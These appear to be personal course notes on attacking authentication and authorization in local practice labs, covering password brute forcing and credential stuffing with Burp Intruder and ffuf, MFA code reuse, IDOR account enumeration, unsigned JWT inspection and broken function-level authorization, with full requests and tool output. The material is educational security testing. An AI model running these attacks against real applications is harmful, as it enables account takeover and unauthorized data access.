Critical component of application security 
Since many of the flaws are logic based  and this means that we get to review the authentication flow and come up with edge cases to break it

**Authentication / Authorization or Access Control**

- Authentication is who u are its  your identity
- Authorization or Access Control on the other hand is what you are allowed to do

Now there are two main ways we are going to approach attacking authentication
- first we will look at for brute force attack something that a lot of development teams underestimate
- Second we will look at logic issues favorite things to test for as they often turn out to be critical issues and usually undetected by scanners and automated tools

## ==Brute-force Attacks==

Auth 0x01 LAB 1

url = localhost/labs/a0x01.php
username = jeremy
password = ?
First capture the request using burpsuite

```python
┌──(cyber㉿kali)-[~]
└─$ cat req.txt
POST /labs/a0x01.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://localhost
Connection: close
Referer: http://localhost/labs/a0x01.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

username=jeremy&password=FUZZ

```

Two way to brute force this 1) Burp suite Intruder 2) Fuzzing using FFUF
In burp capture the post request where the username and password is present that u put it send it to intruder grab the area of after password= grab this  by $Add sign for e.g here's the hello word select the payload ignore the warning and attack it
```python

§POST /labs/a0x01.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site

username=hi&password=§hello§§
```

The second method is FFUF tool
first save the request in the req.txt file and change the password=FUZZ which u are trying to brute force it 
```
ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
```
u will see a lot of result to narrow down it use the filter command 
```
ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814

```
For that u need to identify the size for my case its 1814 using -fs and putting that 1814 will narrow the result for us
```python
gbpltw                  [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 38ms]
cowboys1                [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 34ms]
beast                   [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 48ms]
tatiana                 [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 42ms]
durango                 [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 46ms]
qwqwqw                  [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 22ms]
billie                  [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 53ms]
doughboy                [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 62ms]
tyrone                  [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 28ms]
patrick1                [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 57ms]
today                   [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 73ms]
12332                   [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 69ms]
deeznuts                [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 43ms]
juliet                  [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 29ms]
possum                  [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 79ms]
lespaul                 [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 33ms]
breeze                  [Status: 200, Size: 1814, Words: 495, Lines: 47, Duration: 65ms]

```
after doing this and loading the command we will get 
```python
┌──(cyber㉿kali)-[~]
└─$ ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/labs/a0x01.php
 :: Wordlist         : FUZZ: /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Origin: http://localhost
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Connection: close
 :: Header           : Referer: http://localhost/labs/a0x01.php
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Host: localhost
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Sec-Fetch-Site: same-origin
 :: Data             : username=jeremy&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1814
________________________________________________

letmein                 [Status: 200, Size: 1808, Words: 494, Lines: 47, Duration: 76ms]
:: Progress: [10000/10000] :: Job [1/1] :: 692 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
                                                                                                                              
┌──(cyber㉿kali)-[~]
└─$ 

```

##   ==Attacking MFA==

Multi Factor Authentication
Access the Lab no: 2
## [Labs](http://localhost/index.php) / Authentication 0x02

Target account: jeremy

Your credentials: jessamy:pasta

## Your code

910005

The MFA code looks very short we can brute force this and we are submitting the username second time while entering the MFA code 

Capture the POST request using burp suite
```python
POST /labs/a0x02.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: http://localhost
Connection: close
Referer: http://localhost/labs/a0x02.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

username2=jessamy&mfa=910005
```

Now what we have to do here we have to login in to the jeremy account usign the same MFA code for the Jessamy account
```python
username2=jeremy&mfa=910005
```
and forward this request put the intercept on and then u will be enter to the Jeremy Accounts
![[../Screenshot from 2024-05-28 08-57-42.png]]





#   ==Authentication Challenge Walkthrough==

## [Labs](http://localhost/index.php) / Authentication 0x03 [Challenge]

Warning: Accounts will lock after 5 failed login attempts! (You can reset the db at /init.php if needed)

Put anything like name = jeremy and pass = jeremy u see that it will lock out after 5 attempts

so open burp-suite capture the request the POST one 

```python
POST /labs/a0x03.php HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://localhost
Connection: close
Referer: http://localhost/labs/a0x03.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

username=jeremy&password=jeremy
```

In this case we dont know what user to attack and which password to use so we have to use something called Cluster bomb attack using burp suite and ffuf

 Two list one list for usernames and the other for passwords
  Now we have to send the request to the intruder and we have the $Add the username and password both and select the cluster bomb instead of sniper 
  Now load the wordlist in payload for the 1 usernames
  Next we have to add the password list but account will get lock out after 4 password because we have just used it one time to capture the request so we will add 4 top password only
  `123456
 `password
  `letmein
  `password123`
  make a password list for all that  4 above password and it in 4pass.txt
  ![[../Screenshot from 2024-05-28 14-20-59.png]]
   Now lets attack![[../Screenshot from 2024-05-28 14-24-21.png]]
   
   Now Lets Do this using FFUF Also
   copy the post request to a file called req.txt
   and now lets edit the bottom line of it according to the ffuf tool


`username=FUZZUSER&password=FUZZPASS`

now run the command after that BEFORE RUN IT RESET THE DB BY GOING TO THE PAGE /INIT.PHP
`ffuf -request req.txt -request-proto http -mode clusterbomb -w top username shortlist.txt:FUZZUSER -w 4pass.txt:FUZZPASS`
The one which is different from others
and do manually testing in burp to figure out which is correct 3378
```
[Status: 200, Size: 3378, Words: 1270, Lines: 68, Duration: 40ms]
    * FUZZPASS: letmein
    * FUZZUSER: admin

```
Hey!
I also recommend using -mr in your command as then you will be able to use regex and look for the exact response giving you a successful login.

Use the following command:
ffuf -request req.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -w passwords.txt:FUZZPASS -mr "Successfully"

You are basically filtering out responses that have the word - Successfully in it. You can use other words like success too!
Refer to this thread
```python
┌──(cyber㉿kali)-[~]
└─$ ffuf -request req.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -w 4pass.txt:FUZZPASS -mr "Successfully"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://localhost/labs/a0x03.php
 :: Wordlist         : FUZZUSER: /usr/share/seclists/Usernames/top-usernames-shortlist.txt
 :: Wordlist         : FUZZPASS: /home/cyber/4pass.txt
 :: Header           : Origin: http://localhost
 :: Header           : Sec-Fetch-Dest: document
 :: Header           : Sec-Fetch-User: ?1
 :: Header           : Sec-Fetch-Mode: navigate
 :: Header           : Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Header           : Upgrade-Insecure-Requests: 1
 :: Header           : Referer: http://localhost/labs/a0x03.php
 :: Header           : Sec-Fetch-Site: same-origin
 :: Header           : Host: localhost
 :: Header           : Accept-Encoding: gzip, deflate, br
 :: Header           : Connection: close
 :: Header           : User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
 :: Header           : Accept-Language: en-US,en;q=0.5
 :: Data             : username=FUZZUSER&password=FUZZPASS
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: Successfully
________________________________________________

:: Progress: [2/85] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: [Status: 200, Size: 3378, Words: 1270, Lines: 68, Duration: 37ms]
    * FUZZPASS: letmein
    * FUZZUSER: admin

:: Progress: [43/85] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [85/85] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors::: Progress: [85/85] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::

```

# ==Introduction to Authorization==


Authorization and Access control means that what we are allowed to do.
There are different types of Access Control
- **Vertical Access Controls** -> Restrict access to functionality to specific users.
- e.g a vertical access control would prevent a customer on an e-commerce site from accessing administrative controls to edit a product.
- **Horizontal Access Controls** -> These restrict access to resources for a specific user 
- e.g a user may be able to view and update their own account  but they cant update the account details of another user
- **Context Dependent Access Controls** -> that allow or restrict access based on the application's current state
- e.g an application may not allow you to check out if there's nothing in your cart
  
  ##   ==IDOR - Insecure Direct Object Reference==

## [Labs](http://localhost/index.php) / IDOR 0x01

## Your account details

---

Username: isabelle

Address: 11, Lightwood Road, SHW 2EC

Type: user
``
`http://localhost/labs/e0x02.php?account=1009`

**Access Control or Authorization Lab**

so here we have some account details and username but the url seems to have number here  which is account number like a user ID
So whenever we see this kind of thing like a user ID being passed as a parameter either in the URL as part of the query string or in the body of a request or maybe even a header or a cookie we want to try manipulate this and change it and see whether we can access something that we can access something that we should not be able to access to it 

**Solve this lab using burp and ffuf**

capture the request in burp and send it to repeater and change the `account=1001` and analyze whats the response is in `Pretty` and scroll down and check username is change and address is change and this is called *IDOR* insecure direct object reference and whats happening in this application is returning information based on the object ID This is quite prevalent issue especially within API driven applications although when we are dealing with APIs we call this broken object level authorization BOLA but its the same thing
Doing Bug Bounty while testing for this create multiple accounts lets say user a and user b and whenever u access user a u see something like the ID or the username being passed in the query as the part of the body in a post request what u do is substitute that user for user b id or user b username and see whether u can access user b information
And there is two reason for that One if u do discover a idor you're only accessing information from the accounts that u control so you're not accidentally looking at information from live users 
And two it means that you can also test for things like updating accounts without impacting end users as well So we always need to keep in mind the impact of our attacks as we test applications 

**Back to the labs**
here we have Type: user in Response pretty section what we want to find is the admin account

and send to intruder the request 

```python
GET /labs/e0x02.php?account=1001 HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost/
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
```

and select this area only 
`GET /labs/e0x02.php?account=1001 HTTP/1.1`
select the 1001 and $ADD
mark this area and come to payloads
check the account number which is 1000 so we can run a python script to generate a number 1 to 5000
```python
for i in range(1,5000)
	print(i)
```
and save this in num.py
and output this to 
`python3 num.py > num.txt`

and then get back to burpsuite and load this payload and after that search for admin account 
![[../Screenshot from 2024-05-29 16-18-25.png]]
and u have 4 result
admin: as harry jack lucy nancy 
**Second Step Same Procedure Using FFUF**

`ffuf -u http://localhost/labs/e0x02.php?account=FUZZ -w num.txt -mr 'admin' `

```python
┌──(cyber㉿kali)-[~/tmp]
└─$ ffuf -u http://localhost/labs/e0x02.php?account=FUZZ -w num.txt -mr 'admin' 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://localhost/labs/e0x02.php?account=FUZZ
 :: Wordlist         : FUZZ: /home/cyber/tmp/num.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: admin
________________________________________________

1008                    [Status: 200, Size: 895, Words: 193, Lines: 33, Duration: 9ms]
1012                    [Status: 200, Size: 897, Words: 193, Lines: 33, Duration: 9ms]
1010                    [Status: 200, Size: 897, Words: 193, Lines: 33, Duration: 10ms]
1014                    [Status: 200, Size: 894, Words: 193, Lines: 33, Duration: 13ms]
:: Progress: [4999/4999] :: Job [1/1] :: 1047 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
                                                                                                                              
┌──(cyber㉿kali)-[~/tmp]
└─$ 


```

and verify this result by putting `account=1012` this in to a url 
==================================================================
`http://localhost/labs/e0x02.php?account=1012`

## Your account details

---

Username: lucy

Address: 141, Diamond Street, LDN 2RT

Type: admin
==================================================================

# ==Introduction to APIs==

API stands for Application Programming Interface and they can make up more than 80% of internet traffic and many application are powered by them now in practical term they are not that different from the requests and responses that we have seen so far But API applications behave in a slightly different way and our approach to this application is also different typically an API request returns an endpoint that returns some data and then data is processed client-side
for example if u had a web page that showed live updates instead of refreshing the whole page and fetching the entire document every time to see the updated information just the data needed for the area that's being updated will be fetched and then JavaScript will handle that information and render it nicely for the user
Many companies also have APIs that can be called to fetch info such as the google maps API or the Twitter API and this means that developers can build apps and use information supplied by these APIs with in their application 
**API EXAMPLE `https://catfact.ninja`**
made a request using curl
```python
┌──(cyber㉿kali)-[~]
└─$ curl https://catfact.ninja/fact
{"fact":"Baking chocolate is the most dangerous chocolate to your cat.","length":61}               
┌──(cyber㉿kali)-[~]
└─$ 
```

Now to analyze the request in burpsuite 
```python
┌──(cyber㉿kali)-[~]
└─$ curl --proxy http://localhost:8080 https://catfact.ninja/fact -k
{"fact":"Blue-eyed, pure white cats are frequently deaf.","length":47} 
```

GET REQ -> is to get the infor
POST REQ -> will create info e.g to register a user
PUT REQ -> Is to update the info
DELETE REQ -> Is to delete the info
```
# Troubleshooting

If you get an error that says "Required fields missing" try adding quotes to your content. For example:

`-d '{username: "test", password: "test"}'`

should be updated to:

`-d '{"username": "test", "password": "test"}'`
```
GET a play around with API and get familiar with how to interact with them how to get information and how to pass it 
most application call API in background without knowing always worth reviewing your burp suite traffic identify what calls are made and decide if they are in scope for testing


# ==Broken Access Control==



## [Labs](http://localhost/index.php) / APIs 0x01

## API Index

---

**POST /login.php**

curl -X POST -H "Content-Type: application/json" -d '{username: "admin", password: "password123"}' http://localhost/labs/api/login.php

**GET /account.php**

curl -X GET "http://localhost/labs/api/account.php?token=JWT"

**PUT /account.php**

curl -X PUT -H "Content-Type: application/json" -d '{token: "JWT", username:"username", bio: "New bio information."}' http://localhost/labs/api/account.php




We can see that we have a number of API endpoints We can log in and we can get our accounts information and we can update that account information and here we can see the requirements of each request so we have usernames and then the password to log in and we are given some credentials for test accounts
Doing bugbounty create multiple accounts so that we can test privileges horizontally for e.g we can create with different roles like admin team leader or member we can test their access control vertically as well
So when we login we will get some JSON web token a JWT and we will take a little bit closer look at that in a min and then we will use this so when we get the account info we will pass this JWT in so the application know who's requesting the account information and it will get returned and then if we want to update the account once again we need out token and then the username of the account we want to update and the bio which is what we will be updating 
Copy this request 
`curl -X POST -H "Content-Type: application/json" -d '{"username": "admin", "password": "password123"}' http://localhost/labs/api/login.php`
go-to terminal paste it and update this to `jeremy` and update the password to `cheesecake` 
```python
┌──(cyber㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "jeremy", "password": "cheesecake"}' http://localhost/labs/api/login.php
{"status":"success","token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=."}     
```
We get some token which is actually made up of three parts separated by full stop and the last part is missing 
this is header JSON web `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=`
this is the body that `eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=` contains the claims and then the signature is usually at the ends
Fact the signature is not there means the we can actually tamper with this and change it and the application wont know but usually there is a signature and if we change it the signature wont match and the application will know that the web token is invalid 
the site we can use `jwt.io` for e.g
u can paste it in and see we have a user of jeremy and a role of staff and we could go ahead and tamper with this but JWT  attacks are a little bit out of scope 
if u want to do this manually grab the body copy it 
```python
echo 'eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=' | base64 -d

{"user":"jeremy","role":"staff"} 
```

So now test the second endpoint  
copy this 

```
**GET /account.php**
curl -X GET "http://localhost/labs/api/account.php?token=JWT"
```


back to terminal grab our token and place it in 

```python
┌──(cyber㉿kali)-[~]
└─$ curl -X GET "http://localhost/labs/api/account.php?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=."
{"username":"jeremy","role":"staff","bio":"Java programmer."}
```

here we get username Jeremy and role of staff and the bio and no we want to test whether we can update the account information of a different user 
Once again get and copy jessamy tokens
```
**POST /login.php**

curl -X POST -H "Content-Type: application/json" -d '{username: "admin", password: "password123"}' http://localhost/labs/api/login.php
```

```python
┌──(cyber㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "jessamy", "password": "tiramisu"}' http://localhost/labs/api/login.php
{"status":"success","token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9."}                                                                            
```

Takes note in mouse pad 

Jeremy
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=.`

Jessamy

`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9.`

Coma back to the lab grab the Put request and paste in terminal and see whether Jeremy can update his own  account and verify that the functionality is working as intended so will grab jeremys token 
Obviously when we are using an application the browser will be handling your token for you more often than not you will see a header called authorization and it will have the bearer keyword and it will be there or it will be passed as a cookie or sometimes it will be in local storage 
so here we have jeremy and lets change this to jeremy bio and it says bio updated successfully
```python
┌──(cyber㉿kali)-[~]
└─$ curl -X PUT -H "Content-Type: application/json" -d '{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=.", "username":"jeremy", "bio": "jeremy bio."}' http://localhost/labs/api/account.php
{"status":"success","message":"Bio updated successfully"}   
```
but what we should verify this info so go back to lab grab this get account info pass in jeremy's token and we can see the updated bio info
```python
┌──(cyber㉿kali)-[~]
└─$ curl -X GET "http://localhost/labs/api/account.php?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=." 
{"username":"jeremy","role":"staff","bio":"jeremy bio."} 

```
so lets send the same req with the same session token so this is jeremy session token except we want to target  the user jessamy and this is really a common attack where sometimes you will be able to update or access different user accounts just because the application is taking some input from the user as the target account to update or view and we are going to change this to BFLA  bio which stands for Broken Function Level Authorization which is what this attack is called when we are dealing with APIs  
```python
┌──(cyber㉿kali)-[~]
└─$ curl -X PUT -H "Content-Type: application/json" -d '{"token": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=", "username": "jessamy", "bio": "FLA BIO."}' http://localhost/labs/api/account.php
{"status":"success","message":"Bio updated successfully"}    
```

we could grab jessamy original token and verify this is indeed the case 
copy the get request in labs and put jessamy token and verify it 
```python
┌──(cyber㉿kali)-[~]
└─$ curl -X GET "http://localhost/labs/api/account.php?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9."
{"username":"jessamy","role":"admin","bio":"FLA BIO."}   
```
and we can see that jeremy was able to update the jessamy account so this is broken access control more specifically working with APIs  BFLA dont get too bug bounty terminology 
so this the issue in access control or authorization that jeremy can update the jessamy account 

#   ==Testing with Autorize==

Open Burp suite Install the plugin called Authorize before that install it requirement Jython and select it using setting extension scroll down to jython selection and select it jython standalone 
After installing autorize make a JWT request 
```python
┌──(cyber㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "jeremy", "password": "cheesecake"}' http://localhost/labs/api/login.php
{"status":"success","token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=."}                                                                                                ┌──(cyber㉿kali)-[~]
└─$ 

```

Now here we got the Jeremy token
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=.`

Same for the jessamy token

```python
┌──(cyber㉿kali)-[~]
└─$ curl -X POST -H "Content-Type: application/json" -d '{"username": "jessamy", "password": "tiramisu"}' http://localhost/labs/api/login.php
{"status":"success","token":"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9."}
```

now here we got the jessamy token 
`eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9.`

Back on burp on Autorize settings 
we can add a cookie here and what the application will do is whenever we send a request it will send the same request but this cookie or this token instead so for e.g if we send a request with jeremy token to update jeremy account its going to try and send the same request but with jessamy cookie if that make sense 
copy paste jessamy token in autorize 
`Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVzc2FteSIsInJvbGUiOiJhZG1pbiJ9.`
add the jessamy name and click okay switch autorize onn
Back to terminal 
Before we call the new endpoint and the structure is slightly different because we are now passing JSON Web Token as a cookie rather than as the query string or in the body of the request but essentially its the same thing 

use jeremy token here 
```python
┌──(cyber㉿kali)-[~]
└─$ curl -X PUT "Content-Type: application/json" -b "session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=." -d '{"username": "jeremy", "bio": "new bio v2"}' http://localhost/labs/api/v2/account.php
curl: (3) URL rejected: Malformed input to a URL function
{"status":"success","message":"Bio updated successfully"}   
```

add --proxy localhost:8080 so burp can catch it
```python
curl -X PUT --proxy localhost:8080 "Content-Type: application/json" -b "session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0=.eyJ1c2VyIjoiamVyZW15Iiwicm9sZSI6InN0YWZmIn0=." -d '{"username": "jeremy", "bio": "new bio v2"}' http://localhost/labs/api/v2/account.php`
```

![[../Screenshot from 2024-06-02 07-55-33.png]]
and we can see that the authorization flagged as bypassed this is definitely something worth investigating 
and then u can change the endpoint to account2.php and saw the reqeust in burp and then put the jessamy token instead and saw the request in burp in autorize as enforced 
Once u setup u can test a lot of endpoints and lots of different pieces of functionality  lets say u are logged in  as a user and you want to go and update their account or u want  to update their email password access areas of application that other users should not be able to access u can do all of that quickly comeback to authorize see whats bypassed and see whats enforced 